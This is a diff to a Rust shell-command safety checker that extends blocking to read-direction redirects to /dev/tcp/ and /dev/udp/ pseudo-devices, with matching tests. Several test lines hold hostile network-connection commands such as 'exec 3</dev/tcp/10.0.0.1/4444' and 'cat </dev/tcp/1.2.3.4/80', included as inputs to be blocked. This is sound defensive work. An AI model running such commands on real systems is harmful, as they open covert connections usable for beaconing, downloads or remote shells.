@@ -1752,10 +1752,12 @@ fn resolve_printf_output(args: &[NormalizedWord]) -> Option<String> {
 
 /// Every resolved target word from `redirections` whose kind represents a
 /// genuine filesystem write (issue #75's Output/Append and discriminated
-/// DuplicateOutput) — the same target set [`check_redirect_targets`]
-/// checks against redirect rules, extracted so
-/// [`scan_redirect_ascent_descent_floor`] (issue #78) can reuse the exact
-/// same applicability filtering rather than duplicating it.
+/// DuplicateOutput) or a connection-establishing open of a `/dev/tcp/`/
+/// `/dev/udp/` pseudo-device via a plain `Input` redirect (issue #455) —
+/// the same target set [`check_redirect_targets`] checks against redirect
+/// rules, extracted so [`scan_redirect_ascent_descent_floor`] (issue #78)
+/// can reuse the exact same applicability filtering rather than
+/// duplicating it.
 fn resolved_redirect_write_targets(redirections: &[Redirection]) -> Vec<String> {
     let mut targets = Vec::new();
     for redir in redirections {
@@ -1775,10 +1777,12 @@ fn resolved_redirect_write_targets(redirections: &[Redirection]) -> Vec<String> 
     targets
 }
 
-/// Whether `kind`'s target is a genuine filesystem write worth a path
-/// check at all — shared by [`resolved_redirect_write_targets`] and
-/// [`scan_redirect_home_env_floor`] (issue #203) so the two can never
-/// diverge on which redirect kinds count as a write.
+/// Whether `kind`'s target is a genuine filesystem write, or a
+/// connection-establishing `/dev/tcp/`/`/dev/udp/` open via a plain
+/// `Input` redirect (issue #455), worth a path check at all — shared by
+/// [`resolved_redirect_write_targets`] and [`scan_redirect_home_env_floor`]
+/// (issue #203) so the two can never diverge on which redirect kinds
+/// count as a write.
 fn is_redirect_write_applicable(kind: &FileRedirectionKind, normalized: &[NormalizedWord]) -> bool {
     match kind {
         // Issue #425: `<>` opens its target for both reading and writing —
@@ -1789,6 +1793,21 @@ fn is_redirect_write_applicable(kind: &FileRedirectionKind, normalized: &[Normal
         FileRedirectionKind::Output
         | FileRedirectionKind::Append
         | FileRedirectionKind::ReadAndWrite => true,
+        // Issue #455: an ordinary `<` target is harmless to read, so it
+        // stays excluded — except `/dev/tcp/`/`/dev/udp/`, where bash
+        // establishes the connection on open() regardless of direction
+        // (the same reasoning `ReadAndWrite`'s #425 comment above states),
+        // making `cat </dev/tcp/host/port` and `exec 3</dev/tcp/host/port`
+        // connect/beacon/download primitives just like the write-direction
+        // forms. Scoped to that one target shape so every other `Input`
+        // read (`cat < file.txt`) is unaffected.
+        FileRedirectionKind::Input => normalized.iter().any(|word| {
+            matches!(
+                word.resolution(),
+                Resolution::Resolved(s)
+                    if s.starts_with("/dev/tcp/") || s.starts_with("/dev/udp/")
+            )
+        }),
         // `<&` never writes its target the way `>&`/`>`/`>>` can — the
         // redirect rules this checks against are specifically about
         // overwriting a dangerous path, so a read-only duplication
@@ -1796,7 +1815,7 @@ fn is_redirect_write_applicable(kind: &FileRedirectionKind, normalized: &[Normal
         // already does; excluding it here doesn't skip checking any
         // write, since every genuine write path is covered by the other
         // arms.
-        FileRedirectionKind::Input | FileRedirectionKind::DuplicateInput => false,
+        FileRedirectionKind::DuplicateInput => false,
         // A duplication output target (`2>&1` vs. `>&/dev/sda`) is only
         // a genuine filesystem write — and so only worth a path check —
         // when its resolved value is NOT a bare fd number or `-`.
@@ -14959,14 +14978,36 @@ mod tests {
         assert_decision("exec 3>/dev/tcp/10.0.0.1/4444", Decision::Block);
     }
 
+    // ==== Issue #455: read-only `<` redirect to /dev/tcp//dev/udp ====
+
     #[test]
-    fn plain_input_redirect_to_dev_tcp_stays_allow() {
-        // Out of this issue's scope: `is_redirect_write_applicable`
-        // deliberately treats a read-only `<` as never worth a
-        // dangerous-target check (its own docs) — a genuine gap for the
-        // `cat </dev/tcp/host/port` connect-and-read shape, but a
-        // pre-existing one this issue's `<>` repro doesn't touch.
-        assert_decision("exec 3</dev/tcp/10.0.0.1/4444", Decision::Allow);
+    fn plain_input_redirect_to_dev_tcp_now_blocks() {
+        // Was Allow before issue #455: `is_redirect_write_applicable`
+        // used to skip every plain `Input` target. Opening
+        // `/dev/tcp/host/port` for reading still establishes the TCP
+        // connection, so `exec 3</dev/tcp/host/port` is the same
+        // connect/beacon primitive as the `>`/`<>` forms above.
+        assert_decision("exec 3</dev/tcp/10.0.0.1/4444", Decision::Block);
+    }
+
+    #[test]
+    fn cat_input_redirect_to_dev_tcp_blocks() {
+        assert_decision("cat </dev/tcp/1.2.3.4/80", Decision::Block);
+    }
+
+    #[test]
+    fn read_write_redirect_to_dev_tcp_control_still_blocks() {
+        // Issue #455's repro table control row: already Block since
+        // issue #425, unaffected by this change.
+        assert_decision("exec 3<>/dev/tcp/1.2.3.4/80", Decision::Block);
+    }
+
+    #[test]
+    fn plain_input_redirect_to_ordinary_file_still_allows() {
+        // Regression guard: the issue #455 fix is scoped to
+        // `/dev/tcp/`/`/dev/udp/` targets only — an ordinary-file `<`
+        // redirect must stay unaffected.
+        assert_decision("cat < file.txt", Decision::Allow);
     }
 
     #[test]
